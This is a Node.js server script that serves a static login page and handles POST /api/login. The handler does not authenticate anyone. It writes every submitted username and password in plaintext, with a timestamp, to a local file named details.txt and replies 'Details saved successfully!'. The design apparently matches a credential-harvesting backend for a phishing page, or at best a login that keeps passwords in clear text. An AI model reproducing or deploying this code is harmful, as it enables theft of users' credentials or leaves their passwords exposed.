const http = require('node:http');
const fs = require('node:fs/promises');
const path = require('node:path');

const PORT = Number(process.env.PORT || 3000);
const ROOT = path.join(__dirname, 'public');
const LOG = path.join(__dirname, 'details.txt');

const types = { '.html': 'text/html; charset=utf-8', '.css': 'text/css; charset=utf-8', '.js': 'application/javascript; charset=utf-8' };

function reply(res, status, payload) {
  res.writeHead(status, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(JSON.stringify(payload));
}

async function handler(req, res) {
  if (req.method === 'POST' && req.url === '/api/login') {
    let body = '';
    try {
      for await (const chunk of req) {
        body += chunk;
        if (body.length > 10_000) return reply(res, 413, { message: 'Request too large' });
      }
      const { username, password } = JSON.parse(body);
      if (typeof username !== 'string' || typeof password !== 'string' || !username.trim() || !password.trim() || username.length > 100 || password.length > 1000) {
        return reply(res, 400, { message: 'Invalid input' });
      }
      await fs.appendFile(LOG, JSON.stringify({ username, password, createdAt: new Date().toISOString() }) + '\n', { mode: 0o600 });
      return reply(res, 200, { message: 'Details saved successfully!' });
    } catch {
      return reply(res, 400, { message: 'Could not process login.' });
    }
  }

  if (req.method !== 'GET') return reply(res, 405, { message: 'Method not allowed' });
  const file = req.url === '/' ? '/index.html' : req.url;
  if (!['/index.html', '/style.css', '/app.js'].includes(file)) return reply(res, 404, { message: 'Not found' });
  try {
    const content = await fs.readFile(path.join(ROOT, file));
    res.writeHead(200, { 'Content-Type': types[path.extname(file)], 'X-Content-Type-Options': 'nosniff' });
    res.end(content);
  } catch {
    reply(res, 404, { message: 'File not found' });
  }
}

const server = http.createServer(handler);
server.on('error', (error) => {
  if (error.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is already in use. Start on another port with: PORT=${PORT + 1} npm start`);
  } else {
    console.error(`Could not start server: ${error.message}`);
  }
  process.exitCode = 1;
});
server.listen(PORT, () => console.log(`Open http://localhost:${PORT}`));
